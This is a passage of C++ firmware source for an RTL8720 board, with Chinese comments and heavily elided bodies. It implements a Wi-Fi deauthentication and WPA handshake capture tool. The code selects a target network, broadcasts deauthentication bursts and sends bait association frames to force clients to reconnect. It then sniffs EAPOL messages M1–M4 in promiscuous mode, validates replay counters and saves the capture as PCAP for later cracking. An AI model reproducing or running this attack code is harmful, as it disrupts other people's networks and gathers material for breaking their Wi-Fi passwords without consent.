...
// 严禁 Serial 输出：本板 PA_7 为 LOG_TX 复用脚被 BACK 键占用，Serial 从未
// begin()，未初始化时调用 write 会在 uart_adapter[0].UARTx(NULL) 上忙等/空指针
// 访问导致挂死。全部日志输出替换为空操作宏（原 Serial.print/println）。
// 可变参宏同时兼容无参调用 HS_SAFE_LOG()。
#define HS_SAFE_LOG(...) ((void)0)
...
static void addKnownClient(const uint8_t* mac) {
  ...
  if (knownClientCount < 8) {
    ...
    HS_SAFE_LOG(F("[ClientCache] Added STA ")); HS_SAFE_LOG(macToString(mac,6));
  }
}
...
static inline void pauseCaptureForDeauth() {
  HS_SAFE_LOG(F("[Deauth] Pausing capture (disable promiscuous)..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(50);
}
static inline void resumeCaptureAfterDeauth(unsigned long waitMs) {
  HS_SAFE_LOG(F("[Deauth] Waiting ")); HS_SAFE_LOG(waitMs); HS_SAFE_LOG(F("ms before resuming capture..."));
  delay(waitMs);
  HS_SAFE_LOG(F("[Deauth] Resuming capture (enable promiscuous)..."));
...
void resetGlobalHandshakeData() {
  ...
  HS_SAFE_LOG(F("Global handshake data reset"));
}
...
void printHandshakeData() {
  HS_SAFE_LOG(F("---- Captured Handshake Data ----"));
  HS_SAFE_LOG(F("Total handshake frames captured: "));
  HS_SAFE_LOG(capturedHandshake.frameCount);
  HS_SAFE_LOG(F("Total management frames captured: "));
  HS_SAFE_LOG(capturedManagement.frameCount);
  
  // 显示目标网络信息
  HS_SAFE_LOG(F("---- Target Network Information ----"));
  HS_SAFE_LOG(F("SSID: "));
  HS_SAFE_LOG(_selectedNetwork.ssid);
  HS_SAFE_LOG(F("BSSID: "));
  HS_SAFE_LOG(macToString(_selectedNetwork.bssid, 6));
  HS_SAFE_LOG(F("Channel: "));
  HS_SAFE_LOG(_selectedNetwork.ch);
  HS_SAFE_LOG(F("---- End of Target Network Information ----"));
  
  // Iterate through each stored handshake frame.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    HS_SAFE_LOG(F("Handshake Frame "));
    HS_SAFE_LOG(i + 1);
    HS_SAFE_LOG(F(" ("));
    HS_SAFE_LOG(hf.length);
    HS_SAFE_LOG(F(" bytes):"));
    ...
    if (hf.length >= 24) {
      ...
      HS_SAFE_LOG(F("FC=0x")); HS_SAFE_LOG(fc, HEX);
      HS_SAFE_LOG(F(" toDS=")); HS_SAFE_LOG(toDS);
      HS_SAFE_LOG(F(" fromDS=")); HS_SAFE_LOG(fromDS);

      HS_SAFE_LOG(F("DA=")); HS_SAFE_LOG(macToString(da, 6));
      HS_SAFE_LOG(F("SA=")); HS_SAFE_LOG(macToString(sa, 6));
      HS_SAFE_LOG(F("BSSID=")); HS_SAFE_LOG(macToString(bssid, 6));

      bool bssidMatch = true;
      for (int j=0;j<6;j++){ if (bssid[j] != _selectedNetwork.bssid[j]) { bssidMatch=false; break; } }
      HS_SAFE_LOG(F("BSSID Match: ")); HS_SAFE_LOG(bssidMatch ? F("YES") : F("NO"));

      // 显示帧判定的消息类型（若已填充）
      if (hf.messageType >= 1 && hf.messageType <= 4) {
        HS_SAFE_LOG(F("Message Type: M")); HS_SAFE_LOG(hf.messageType);
      }

      // 显示目标BSSID用于对比
      HS_SAFE_LOG(F("Target BSSID: "));
      HS_SAFE_LOG(macToString(_selectedNetwork.bssid, 6));
    }
  ...
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    ...
    HS_SAFE_LOG(F("Management Frame "));
    HS_SAFE_LOG(i + 1);
    HS_SAFE_LOG(F(" ("));
    HS_SAFE_LOG(mf.length);
    HS_SAFE_LOG(F(" bytes):"));
    
    // 显示MAC地址信息
    if (mf.length >= 12) {
      HS_SAFE_LOG(F("Source MAC: "));
      HS_SAFE_LOG(macToString(&mf.data[6], 6));
      HS_SAFE_LOG(F("Destination MAC: "));
      HS_SAFE_LOG(macToString(&mf.data[0], 6));
      HS_SAFE_LOG(F("BSSID: "));
      HS_SAFE_LOG(macToString(&mf.data[10], 6));
    }
    
    HS_SAFE_LOG(F("--------------------------------"));
  }
  
  HS_SAFE_LOG(F("---- End of Handshake Data ----"));
}
...
void deauthAndSniff_legacy() {
  ...
  // 停止现有的数据包侦测功能以避免冲突
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Stopping existing packet detection..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  ...
  if (g_verboseHandshakeLog) {
    HS_SAFE_LOG(F("Target network: "));
    HS_SAFE_LOG(_selectedNetwork.ssid);
    HS_SAFE_LOG(F(" ("));
    HS_SAFE_LOG(macToString(_selectedNetwork.bssid, 6));
    HS_SAFE_LOG(F(") on channel "));
    HS_SAFE_LOG(_selectedNetwork.ch);
  }
  
  // 检查目标网络是否有效
  if (_selectedNetwork.ch == 0 || _selectedNetwork.ssid == "") {
    HS_SAFE_LOG(F("ERROR: Invalid target network selected!"));
  ...
  if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("Setting channel to: ")); HS_SAFE_LOG(_selectedNetwork.ch); }
  int channelResult = wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
  if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("Channel set result: ")); HS_SAFE_LOG(channelResult); }
...
// 预先诱发：抓包前先广播大量解除认证帧，然后等待适配时长再启动抓包
  if (g_captureMode != CAPTURE_MODE_PASSIVE) {
    HS_SAFE_LOG(F("[PreDeauth] Burst broadcast deauth before starting capture"));
    // 组合常见原因码，分批次发送
    ...
    HS_SAFE_LOG(F("[Deauth] Skipping pre-deauth (PASSIVE mode)"));
  }
  ...
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Enabling promiscuous mode for handshake capture..."));
  int promiscResult = wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("Promiscuous mode result: ")); HS_SAFE_LOG(promiscResult); }
  ...
  if (!strictCaptureMode) {
    ...
    HS_SAFE_LOG(F("[Bait] Send auth/assoc from STA ")); HS_SAFE_LOG(macToString(baitSta,6));
    // 发送认证与关联请求
...
// ----- Deauth Phase -----
    ...
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Starting deauth phase..."));
      // Pause capture while sending deauth
      pauseCaptureForDeauth();
      unsigned long deauthPhaseStart = millis();
      int deauthPacketCount = 0;
      
      if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("Target BSSID: ")); HS_SAFE_LOG(macToString(deauth_bssid, 6)); }
      ...
      if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("Sent ")); HS_SAFE_LOG(deauthPacketCount); HS_SAFE_LOG(F(" deauth packets")); }
// Resume capture quickly to avoid missing immediate M1
      resumeCaptureAfterDeauth(120);
      wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
    } else {
      HS_SAFE_LOG(F("[Deauth] Skipping deauth phase (non-ACTIVE mode)"));
    }

    // ----- Sniff Phase -----
      if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Starting sniff phase..."));

    if (promiscResult != 0) {
      if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Re-enabling promiscuous mode..."));
...
// Resume capture quickly to avoid missing immediate EAPOL
      ...
      if (hasBothHandshakeDirections() && capturedManagement.frameCount < 3) {
        if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Early management capture trigger: both directions seen, switching to management capture..."));
        break;
      }
      // 最小嗅探时间门限：至少嗅探1.5秒才允许判定完成
      if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete()) {
        if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Complete 4-way handshake detected (after min sniff time), exiting sniff phase early"));
        break;
      }
    }

  if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete() && capturedManagement.frameCount >= 3) {
      if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Complete handshake and management frames captured, exiting capture loop"));
      break;
    }
...
// Resume capture quickly to avoid missing immediate EAPOL
  ...
  if ((isHandshakeComplete() || (capturedHandshake.frameCount >= 2 && hasBothHandshakeDirections())) && capturedManagement.frameCount < 3) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Starting dedicated management frame capture phase..."));
  ...
  if (g_verboseHandshakeLog) {
    HS_SAFE_LOG(F("Current handshake count: "));
    HS_SAFE_LOG(capturedHandshake.frameCount);
    HS_SAFE_LOG(F(" / "));
    HS_SAFE_LOG(MAX_HANDSHAKE_FRAMES);
    HS_SAFE_LOG(F(", management frames: "));
    HS_SAFE_LOG(capturedManagement.frameCount);
    HS_SAFE_LOG(F(" / "));
    HS_SAFE_LOG(MAX_MANAGEMENT_FRAMES);
    HS_SAFE_LOG(F(", callback triggered: "));
    HS_SAFE_LOG(sniffCallbackTriggered ? "YES" : "NO");
    HS_SAFE_LOG(F(", elapsed time: "));
    HS_SAFE_LOG((millis() - overallStart) / 1000);
    HS_SAFE_LOG(F("s"));
  }
  
  if (!sniffCallbackTriggered && (millis() - overallStart) > 5000) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("No callback triggered, re-enabling promiscuous mode..."));
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
    delay(100);
    wifi_set_promisc(RTW_PROMISC_ENABLE, rtl8720_sniff_callback, 1);
  ...
  if (capturedHandshake.frameCount > 0 || capturedManagement.frameCount > 0) {
    if (g_verboseHandshakeLog) {
      HS_SAFE_LOG(F("Partial capture progress: "));
      HS_SAFE_LOG(capturedHandshake.frameCount);
      HS_SAFE_LOG(F(" handshake frames, "));
      HS_SAFE_LOG(capturedManagement.frameCount);
      HS_SAFE_LOG(F(" management frames - continuing..."));
    }
  }
  ...
  if (isHandshakeComplete() && hasBothHandshakeDirections()) {
    ...
    if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("PCAP size: ")); HS_SAFE_LOG(pcapData.size()); HS_SAFE_LOG(F(" bytes")); }
    ...
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Handshake data saved to global storage"));
    if (g_verboseHandshakeLog) printHandshakeData();
  }
  
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Disabling promiscuous mode..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(200);
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Restoring original channel..."));
  wext_set_channel(WLAN0_NAME, AP_Channel.toInt());
  delay(200);
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("Finished deauth+sniff cycle."));
  readyToSniff = false;
  sniffer_active = false;
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("=== Handshake capture completed status updated ==="));
...
void deauthAndSniff() {
  ...
  HS_SAFE_LOG(F("[NonBlocking] Capture state machine initialized"));
}
...
void deauthAndSniff_update() {
  ...
  if (currentTime - g_overallCaptureStartTime > 60000) {
    HS_SAFE_LOG(F("[NonBlocking] Overall timeout reached"));
  ...
  switch (g_captureState) {
    ...
    case CAPTURE_STATE_INIT:
      ...
      if (currentTime - g_captureStateStartTime > 200) {
        ...
        HS_SAFE_LOG(F("[NonBlocking] Entering PRE_DEAUTH state"));
      }
      break;
    ...
    case CAPTURE_STATE_PRE_DEAUTH:
      ...
      if (g_captureMode != CAPTURE_MODE_PASSIVE) {
        ...
        if (currentTime - g_captureStateStartTime > waitTime) {
          ...
          g_captureStateStartTime = currentTime;
          HS_SAFE_LOG(F("[NonBlocking] Entering DEAUTH_PHASE state"));
        }
      } else {
        HS_SAFE_LOG(F("[Deauth] Skipping pre-deauth (PASSIVE mode)"));
        g_captureState = CAPTURE_STATE_DEAUTH_PHASE;
    ...
    case CAPTURE_STATE_DEAUTH_PHASE:
      ...
      if (g_captureMode == CAPTURE_MODE_ACTIVE) {
        if (currentTime - g_captureStateStartTime < 1500) {
          ...
          g_captureStateStartTime = currentTime;
          HS_SAFE_LOG(F("[NonBlocking] Entering SNIFF_PHASE state"));
        }
      } else {
        HS_SAFE_LOG(F("[Deauth] Skipping deauth phase (non-ACTIVE mode)"));
        g_captureState = CAPTURE_STATE_SNIFF_PHASE;
      ...
      if (currentTime - g_captureStateStartTime < sniffInterval) {
        ...
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeComplete()) {
            HS_SAFE_LOG(F("[NonBlocking] Complete handshake detected during sniff, setting flags"));
            // 生成握手包数据
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("PCAP size: ")); HS_SAFE_LOG(pcapData.size()); HS_SAFE_LOG(F(" bytes")); }
            globalPcapData = pcapData;
        ...
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeCompleteQuickCapture()) {
            HS_SAFE_LOG(F("[NonBlocking] Complete handshake detected at sniff phase end, setting flags"));
            // 生成握手包数据
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("PCAP size: ")); HS_SAFE_LOG(pcapData.size()); HS_SAFE_LOG(F(" bytes")); }
            globalPcapData = pcapData;
            ...
            handshakeJustCaptured = true;
            g_captureState = CAPTURE_STATE_COMPLETE;
            HS_SAFE_LOG(F("[NonBlocking] Entering COMPLETE state"));
          } else {
            HS_SAFE_LOG(F("[NonBlocking] Invalid handshake detected, clearing stats and restarting"));
            // 清空统计重新开始抓包
            resetCaptureData();
            ...
            g_captureState = CAPTURE_STATE_INIT;
            g_captureStateStartTime = currentTime;
            HS_SAFE_LOG(F("[NonBlocking] Restarting capture state machine"));
          }
          ...
          g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
          g_captureStateStartTime = currentTime;
          HS_SAFE_LOG(F("[NonBlocking] Entering MGMT_CAPTURE state"));
        } else if (g_captureMode == CAPTURE_MODE_EFFICIENT && !isHandshakeComplete()) {
          g_captureState = CAPTURE_STATE_EFFICIENT_BURST;
          g_captureStateStartTime = currentTime;
          HS_SAFE_LOG(F("[NonBlocking] Entering EFFICIENT_BURST state"));
        } else {
          g_captureState = CAPTURE_STATE_COMPLETE;
          HS_SAFE_LOG(F("[NonBlocking] Entering COMPLETE state"));
        }
    ...
    case CAPTURE_STATE_EFFICIENT_BURST:
      ...
      if (!isHandshakeComplete()) {
        ...
        if (currentTime - g_captureStateStartTime > 1900) {
          g_captureState = CAPTURE_STATE_SNIFF_PHASE;
          g_captureStateStartTime = currentTime;
          HS_SAFE_LOG(F("[NonBlocking] Re-entering SNIFF_PHASE state"));
        }
      } else {
        g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
        g_captureStateStartTime = currentTime;
    ...
    case CAPTURE_STATE_MGMT_CAPTURE:
      ...
      if (capturedManagement.frameCount < 3 && (currentTime - g_captureStateStartTime < 20000)) {
        ...
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeComplete()) {
            HS_SAFE_LOG(F("[NonBlocking] Complete handshake detected during mgmt capture, setting flags"));
            // 生成握手包数据
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("PCAP size: ")); HS_SAFE_LOG(pcapData.size()); HS_SAFE_LOG(F(" bytes")); }
            globalPcapData = pcapData;
        ...
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeCompleteQuickCapture()) {
            HS_SAFE_LOG(F("[NonBlocking] Complete handshake detected at mgmt phase end, setting flags"));
            // 生成握手包数据
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("PCAP size: ")); HS_SAFE_LOG(pcapData.size()); HS_SAFE_LOG(F(" bytes")); }
            globalPcapData = pcapData;
            ...
            HS_SAFE_LOG(F("[NonBlocking] Invalid handshake detected at mgmt phase end, clearing stats and restarting"));
            // 清空统计重新开始抓包
            resetCaptureData();
            resetGlobalHandshakeData();
            // 重新启动抓包状态机
            g_captureState = CAPTURE_STATE_INIT;
            g_captureStateStartTime = currentTime;
            HS_SAFE_LOG(F("[NonBlocking] Restarting capture state machine from mgmt phase"));
    ...
    case CAPTURE_STATE_COMPLETE:
      ...
      if (g_verboseHandshakeLog) {
        ...
        HS_SAFE_LOG(sniffCallbackTriggered ? "YES" : "NO");
        HS_SAFE_LOG(F(", elapsed time: "));
        HS_SAFE_LOG((currentTime - g_overallCaptureStartTime) / 1000);
        HS_SAFE_LOG(F("s"));
      }
      
      // 在检查标志位之前，先验证握手包完整性
      if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
        HS_SAFE_LOG(F("[NonBlocking] Checking handshake completeness..."));
        if (isHandshakeCompleteQuickCapture()) {
          HS_SAFE_LOG(F("[NonBlocking] Handshake completeness verified, setting flags"));
          // 生成握手包数据
          std::vector<uint8_t> pcapData = generatePcapBuffer();
          if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("PCAP size: ")); HS_SAFE_LOG(pcapData.size()); HS_SAFE_LOG(F(" bytes")); }
          globalPcapData = pcapData;
          ...
          HS_SAFE_LOG(F("[NonBlocking] Invalid handshake detected in complete state, clearing stats and restarting"));
          // 清空统计重新开始抓包
          resetCaptureData();
          resetGlobalHandshakeData();
          // 重新启动抓包状态机
          g_captureState = CAPTURE_STATE_INIT;
          g_captureStateStartTime = currentTime;
          HS_SAFE_LOG(F("[NonBlocking] Restarting capture state machine from complete state"));
          return; // 直接返回，不继续完成流程
        }
      }
      ...
      if (isHandshakeCaptured && handshakeDataAvailable) {
        HS_SAFE_LOG(F("[NonBlocking] Handshake captured successfully!"));
        // 抓包完成LED指示
        extern void completeHandshakeLED();
        completeHandshakeLED();
      } else {
        HS_SAFE_LOG(F("[NonBlocking] Handshake capture failed"));
      }
      ...
      HS_SAFE_LOG(F("[NonBlocking] Capture state machine completed"));
      break;
...
void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
  ...
  if (g_verboseHandshakeLog && (millis() - lastDebugLog > 5000)) {
    HS_SAFE_LOG(F("[Handshake] Callbacks triggered: "));
    HS_SAFE_LOG(callbackCount);
    HS_SAFE_LOG(F(", handshake frames: "));
    HS_SAFE_LOG(capturedHandshake.frameCount);
    HS_SAFE_LOG(F("/4, management frames: "));
    HS_SAFE_LOG(capturedManagement.frameCount);
    HS_SAFE_LOG(F("/10, total processed: "));
    HS_SAFE_LOG(totalFramesProcessed);
    lastDebugLog = millis();
    callbackCount = 0;
  }
  ...
  if (type == 0) {
    if (g_verboseHandshakeLog) {
      ...
      HS_SAFE_LOG(F("[MGMT] subtype=")); HS_SAFE_LOG((fcdbg>>4)&0xF);
      HS_SAFE_LOG(F(" len=")); HS_SAFE_LOG(length);
      HS_SAFE_LOG(F(" bssid=")); if (length>=22) HS_SAFE_LOG(macToString(&packet[16],6)); else HS_SAFE_LOG("-");
    }
          ...
          if (macIsUnicast(da) && !macEquals6(da, _selectedNetwork.bssid)) {
            ...
            if (parseAssocRespStatus(packet, length, statusCode)) {
              if (statusCode == 0) {
                ...
                if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("[MGMT][AssocResp] success for STA ")); HS_SAFE_LOG(macToString(da,6)); }
              } else {
                if (g_verboseHandshakeLog) { HS_SAFE_LOG(F("[MGMT][AssocResp] non-success status=")); HS_SAFE_LOG(statusCode); }
              }
            }
          }
        }
  ...
  if (length >= 24) {
    ...
    if (extractAddrsForDataFrame(packet, length, da, sa, bssid)) {
      ...
      if (g_verboseHandshakeLog) {
        ...
        HS_SAFE_LOG(F("[DATA] toDS=")); HS_SAFE_LOG(toDS); HS_SAFE_LOG(F(" fromDS=")); HS_SAFE_LOG(fromDS);
        HS_SAFE_LOG(F(" DA=")); HS_SAFE_LOG(macToString(da,6)); HS_SAFE_LOG(F(" SA=")); HS_SAFE_LOG(macToString(sa,6));
        HS_SAFE_LOG(F(" BSSID=")); HS_SAFE_LOG(macToString(bssid,6)); HS_SAFE_LOG(F(" bssidMatch=")); HS_SAFE_LOG(isFromTargetBSSID?"Y":"N");
      }
    }
  }
  ...
  if (length >= 24 && strictCaptureMode) {
    if (!isFromTargetBSSID) {
      if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[EAPOL][DROP] BSSID mismatch for target"));
      return;
    }
  }
  ...
  if (length >= 24 && strictCaptureMode) {
    ...
    if (!apInvolved) {
      if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[EAPOL][DROP] AP not involved for target BSSID"));
      return;
    }
  }
  ...
  if (!parsed) return;
  if (g_verboseHandshakeLog) {
    HS_SAFE_LOG(F("[EAPOL] parsed desc=")); HS_SAFE_LOG(info.descriptorType);
    HS_SAFE_LOG(F(" keyInfo=0x")); HS_SAFE_LOG(info.keyInfo, HEX);
    HS_SAFE_LOG(F(" MIC=")); HS_SAFE_LOG(info.hasMic);
    HS_SAFE_LOG(F(" ACK=")); HS_SAFE_LOG(info.hasAck);
    HS_SAFE_LOG(F(" Install=")); HS_SAFE_LOG(info.hasInstall);
    HS_SAFE_LOG(F(" Secure=")); HS_SAFE_LOG(info.hasSecure);
  }
...
bool isHandshakeComplete() {
  ...
  if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) {
    if (g_verboseHandshakeLog) {
      HS_SAFE_LOG(F("[CHK-FAIL] M-set/STA: staLocked=")); HS_SAFE_LOG(staLocked);
      HS_SAFE_LOG(F(" staConsistent=")); HS_SAFE_LOG(staConsistent);
      HS_SAFE_LOG(F(" M1-4=")); HS_SAFE_LOG(hasMessage1); HS_SAFE_LOG(hasMessage2); HS_SAFE_LOG(hasMessage3); HS_SAFE_LOG(hasMessage4);
    }
    return false;
  }
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK] M1-4 present & STA consistent"));
  ...
  if (!(rcM1 && rcM2 && rcM3 && rcM4)) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK-FAIL] Replay pointers missing for one or more M1..M4"));
    return false;
  }
  if (!rcEquals(rcM1, rcM2)) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK-FAIL] rc(M1) != rc(M2)"));
    return false;
  }
  ...
  if (!m3Ok) { if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK-FAIL] rc(M3) not equal to M1 or M1+1")); return false; }
  if (!m4Ok) { if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK-FAIL] rc(M4) not equal to M2 or M1+1")); return false; }
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK] Replay counters pattern OK"));
  // 需要近时 Auth/Assoc 佐证：该 STA 在最近窗口内必须出现过认证/关联
  const unsigned long nowMs = millis();
  uint8_t idx = findKnownClientIndex(staMac);
  if (idx == 255) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK-FAIL] STA not in knownClients table"));
    return false;
  }
  // 仅接受最近成功的 AssocResp/ReassocResp 作为“近时入网”依据
  const unsigned long windowMs = 6000; // 6 秒窗口，更严格
  if (knownClientAuthAssocLastMs[idx] == 0) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK-FAIL] No recent AssocResp/ReassocResp observed for STA"));
    return false;
  }
  if ((nowMs - knownClientAuthAssocLastMs[idx]) > windowMs) {
    if (g_verboseHandshakeLog) {
      HS_SAFE_LOG(F("[CHK-FAIL] AssocResp/ReassocResp too old, delta(ms)="));
      HS_SAFE_LOG(nowMs - knownClientAuthAssocLastMs[idx]);
    }
    return false;
  }
  // 进一步要求：明确的 AssocResp 成功时间戳（与上字段一致时通过）
  if (knownClientAssocRespLastMs[idx] == 0 || (nowMs - knownClientAssocRespLastMs[idx]) > windowMs) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK-FAIL] No recent successful AssocResp within window"));
    return false;
  }
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[CHK] Recent AssocResp/ReassocResp within window OK"));
  return true;
}
...
bool isHandshakeCompleteQuickCapture() {
  ...
  if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) {
    if (g_verboseHandshakeLog) {
      HS_SAFE_LOG(F("[QuickCapture-CHK-FAIL] M-set/STA: staLocked=")); HS_SAFE_LOG(staLocked);
      HS_SAFE_LOG(F(" staConsistent=")); HS_SAFE_LOG(staConsistent);
      HS_SAFE_LOG(F(" M1-4=")); HS_SAFE_LOG(hasMessage1); HS_SAFE_LOG(hasMessage2); HS_SAFE_LOG(hasMessage3); HS_SAFE_LOG(hasMessage4);
    }
    return false;
  }
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[QuickCapture-CHK] M1-4 present & STA consistent"));
  // 精确回放计数模式：M1与M2相等，M3与M4均为 M1+1（大端）
  const uint8_t *rcM1 = nullptr, *rcM2 = nullptr, *rcM3 = nullptr, *rcM4 = nullptr;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
  ...
  if (!(rcM1 && rcM2 && rcM3 && rcM4)) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[QuickCapture-CHK-FAIL] Replay pointers missing for one or more M1..M4"));
    return false;
  }
  if (!rcEquals(rcM1, rcM2)) {
    if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[QuickCapture-CHK-FAIL] rc(M1) != rc(M2)"));
    return false;
  }
  // 某些AP实现不会在M3/M4对回放计数严格+1，而是保持与M1/M2相同或+1
  bool m3Ok = rcEquals(rcM3, rcM1) || rcIsPlusOne(rcM3, rcM1);
  bool m4Ok = rcEquals(rcM4, rcM2) || rcIsPlusOne(rcM4, rcM1);
  if (!m3Ok) { if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[QuickCapture-CHK-FAIL] rc(M3) not equal to M1 or M1+1")); return false; }
  if (!m4Ok) { if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[QuickCapture-CHK-FAIL] rc(M4) not equal to M2 or M1+1")); return false; }
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[QuickCapture-CHK] Replay counters pattern OK"));
  
  // 快速抓包模式：移除时间窗口限制，只要有有效的握手包就认为成功
  // 不再要求近时的 Auth/Assoc 佐证，因为快速抓包可能在不同时间捕获到这些帧
  
  if (g_verboseHandshakeLog) HS_SAFE_LOG(F("[QuickCapture-CHK] Handshake validation passed"));
  return true;
}
